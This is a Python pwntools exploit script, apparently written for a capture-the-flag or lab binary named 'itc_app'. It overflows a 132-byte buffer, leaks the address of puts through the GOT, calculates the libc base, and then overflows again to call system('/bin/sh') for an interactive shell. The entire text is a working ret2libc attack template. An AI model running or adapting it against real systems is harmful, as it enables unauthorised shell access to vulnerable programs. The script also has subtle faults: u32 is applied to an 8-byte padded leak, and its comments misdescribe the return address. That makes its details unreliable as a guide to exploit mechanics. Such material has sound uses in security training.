from pwn import *

# Set up the binary and libc objects
elf = context.binary = ELF('./itc_app')
libc = elf.libc

# Start the process
p = process()

# Receive the initial text or prompt if there's any
try:
    initial_output = p.recvuntil('>', timeout=5)  # Adjust the delimiter based on the actual prompt
    print("Initial output:", initial_output.decode())
except EOFError:
    print("Did not receive initial prompt. Exiting.")
    p.close()
    exit()

# Build the first payload
payload = flat(
    b'A' * 132,
    elf.plt['puts'],  # Address of puts@plt
    elf.sym['main'],  # Address to return to main function for a second chance
    elf.got['puts']   # Address of puts@got to leak
)

# Send the first payload
p.sendline(payload)

# Attempt to receive the leaked address of puts
try:
    puts_leak = u32(p.recvline().strip().ljust(8, b'\x00'))  # Adjust u64 to u32 for 32-bit binaries
except EOFError:
    print("Failed to receive the leaked address. Exiting.")
    p.close()
    exit()

# Calculate libc base address
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

# Build the second payload
payload = flat(
    b'A' * 132,
    libc.sym['system'],    # Address of system() within libc
    next(libc.search(b'/bin/sh\x00')),  # Return address for system(), typically you can use 'exit' function but here we directly jump to '/bin/sh'
    next(libc.search(b'/bin/sh\x00'))  # Argument for system()
)

# Send the second payload
p.sendline(payload)

# Attempt to go interactive
try:
    p.interactive()
except EOFError:
    print("Got EOF while trying to go interactive. The process might have exited.")
    p.close()

